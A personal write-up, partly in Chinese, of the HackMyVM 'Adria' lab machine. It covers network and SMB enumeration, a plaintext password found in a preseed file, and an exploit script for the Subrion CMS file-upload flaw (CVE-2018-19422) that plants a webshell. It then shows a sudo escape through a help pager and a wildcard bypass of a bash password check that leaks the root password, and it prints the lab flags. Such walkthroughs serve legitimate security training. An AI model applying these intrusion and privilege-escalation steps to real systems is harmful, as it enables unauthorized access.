---
title: HMV_adria
tags:
  - sec
status: 
date: 2024-05-14T20:49:52
lastmod: 2025-09-29T20:51:37
toc: "true"
---
## 靶机启动
```shell
68 ◯  arp-scan -l
Interface: ens33, type: EN10MB, MAC: 00:0c:29:31:02:fd, IPv4: 192.168.244.101
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.244.99  f6:39:4a:3d:95:18       (Unknown: locally administered)
192.168.244.102 08:00:27:22:48:cd       PCS Systemtechnik GmbH
192.168.244.190 ca:a7:78:4d:50:e1       (Unknown: locally administered)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.273 seconds (112.63 hosts/sec). 3 responded
```

## 端口扫描
```shell
> nmap 192.168.244.102 -Pn -sT -p- --min-rate 4000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-16 20:50 EDT
Nmap scan report for 192.168.244.102
Host is up (0.046s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

先简单看一下各个服务
```shell
> whatweb adria.hmv
http://adria.hmv [200 OK] Apache[2.4.57], Bootstrap, Cookies[INTELLI_7da515443a], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[192.168.244.102], JQuery, MetaGenerator[Subrion CMS - Open Source Content Management System], Open-Graph-Protocol, PoweredBy[Subrion], Script, Title[Blog :: Powered by Subrion 4.2], UncommonHeaders[x-powered-cms], X-UA-Compatible[IE=Edge]
```

## smb_139+445
枚举一下smb
```shell
[+] Found domain(s):

        [+] ADRIA
        [+] Builtin


[+] Attempting to map shares on 192.168.244.102

//192.168.244.102/print$        Mapping: DENIED Listing: N/A Writing: N/A
//192.168.244.102/DebianShare   Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:

NT_STATUS_CONNECTION_REFUSED listing \*
//192.168.244.102/IPC$  Mapping: N/A Listing: N/A Writing: N/A
//192.168.244.102/nobody        Mapping: DENIED Listing: N/A Writing: N/A
```

```shell
root in ~
≥ smbclient //192.168.244.102/DebianShare -U anonymous -p 445                   20:58
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls -al
NT_STATUS_NO_SUCH_FILE listing \-al
smb: \> ls
  .                                   D        0  Mon Dec  4 04:32:45 2023
  ..                                  D        0  Sat Jul 22 04:10:13 2023
  configz.zip                         N  2756857  Mon Nov  6 10:56:25 2023

                19480400 blocks of size 1024. 15689584 blocks available
smb: \> ?
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> get configz.zip 
getting file \configz.zip of size 2756857 as configz.zip (12820.2 KiloBytes/sec) (average 12820.2 KiloBytes/sec)
smb: \> exit
```
解压之后没发现什么有价值的信息

后面没思路之后看了眼wp,还是这里面
```shell
{21:29}~/workspace/tmp/configz ➭ find . -type f -exec grep "pass" {} \;
d-i passwd/user-fullname string Adam Lewis
d-i passwd/username string alewis
# Normal user's password, either in clear text
#d-i passwd/user-password password insecure
#d-i passwd/user-password-again password insecure
d-i passwd/user-password-crypted 158f5ddb69d03f91bb449ee170913268
d-i passwd/user-uid string 1010
# The installer will warn about weak passwords. If you are sure you know
#d-i user-setup/allow-password-weak boolean true
d-i partman-crypto/passphrase password jojo1989
d-i partman-crypto/passphrase-again password jojo1989
d-i passwd/user-fullname string admin
d-i passwd/username string admin
d-i passwd/user-password password jojo1989
d-i passwd/root-login boolean true
d-i passwd/root-password password jojo1989
```

```
admin
jojo1989
```

## web_80

```shell
Powered by Subrion 4.2

~/workspace/l1uyun_conf  ‹main› $ searchsploit subrion 4.2
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                  |  Path
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                                                                                         | php/webapps/47469.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                                                                                          | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                                                                                       | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                                                                                | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                                                                                        | php/webapps/45150.txt
Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                                                                                           | php/webapps/51110.txt
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

## 文件上传利用
```shell
root@parrot:~/workspace/tmp
 $ python 49876.py -u "http://192.168.22.102/panel/" -l admin -p jojo1989
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422

[+] Trying to connect to: http://192.168.22.102/panel/
[+] Success!
[+] Got CSRF token: 3TOHhuzjpGzSVcG91hjvRjDCyS3Lknl3j71aWIyg
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell title: qkjnzjgasjxszta

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://192.168.22.102/panel/uploads/qkjnzjgasjxszta.phar

$ whoami
www-data

www-data@adria:/var/www/html/uploads$ sudo -l
sudo -l
sudo: unable to resolve host adria: Name or service not known
Matching Defaults entries for www-data on adria:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on adria:
    (adriana) NOPASSWD: /usr/bin/scalar

sudo -u adriana 
```

## 横向移动2adriana
### 利用命令的帮助页面,类more
神奇,原来是这样子利用的,help页面是类似more的样子,可以直接!/bin/bash
下面图里是错的,不用:,直接!bash
![HMV_adria_image_1](https://img.l1uyun.one/HMV_adria_image_1.png)

```shell
cat user.txt
fbd401c3bff5ec92d1ba6f74a2340f0f
```

## 枚举

![HMV_adria_image_2](https://img.l1uyun.one/HMV_adria_image_2.png)


这个脚本一眼看出来能用\*来绕过
```shell
adriana@adria:/opt$ ls -al
total 12
drwxr-xr-x  2 root root 4096 Jan 22 18:20 .
drwxr-xr-x 18 root root 4096 Jul 22  2023 ..
-rwxr-xr-x  1 root root  294 Nov  6  2023 backup
adriana@adria:/opt$ cd backup 
bash: cd: backup: Not a directory
adriana@adria:/opt$ cat backup 
#!/bin/bash

PASSWORD=$(/usr/bin/cat /root/pass)

read -ep "Password: " USER_PASS

if [[ $PASSWORD == $USER_PASS ]] ; then

  /usr/bin/echo "Authorized access"
  /usr/bin/sleep 1
  /usr/bin/zip -r -e -P "$PASSWORD" /opt/backup.zip /var/www/html
else
  /usr/bin/echo "Access denied"
  exit 1
fi
adriana@adria:/opt$
```
找到这个脚本,关键点肯定就在这了,但是我执行不了这个脚本

## 使用ssh获得正常的shell
看了wp,原来是需要ssh上去,那个终端的环境太差了,sudo -l执行不出来
重新ssh之后,发现是能够sudo -l了
```shell
l1uyun in ~/workspace/tmp λ ssh -i id_rsa adriana@192.168.22.102
The authenticity of host '192.168.22.102 (192.168.22.102)' can't be established.
ED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:23: [hashed name]
    ~/.ssh/known_hosts:39: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.22.102' (ED25519) to the list of known hosts.
Linux adria 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan 22 18:16:06 2024 from 192.168.0.30
╭─adriana@adria ~ 
╰─$ sudo -l
sudo: unable to resolve host adria: Name or service not known
Matching Defaults entries for adriana on adria:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User adriana may run the following commands on adria:
    (ALL : ALL) NOPASSWD: /opt/backup
╭─adriana@adria ~ 
╰─$
```

## sudo /opt/backup

在www-date的窗口开一个pspy64,然后adriana的窗口sudo /opt/backup
输入\*号来绕过这个bash的\=\=符号
```shell
 /usr/bin/zip -r -e -P 8eNctPoCh4Potes5eVD7eMxUw6wRBmO /opt/backup.zip /var/www/html 
```

![HMV_adria_image_3](https://img.l1uyun.one/HMV_adria_image_3.png)
## root
使用root密码,ssh连接一下
![HMV_adria_image_4](https://img.l1uyun.one/HMV_adria_image_4.png)

```
╭─root@adria ~ 
╰─# cat root.txt 
3a61b172fd39402aa96b1653a18e38a1
╭─root@adria ~ 
╰─#

```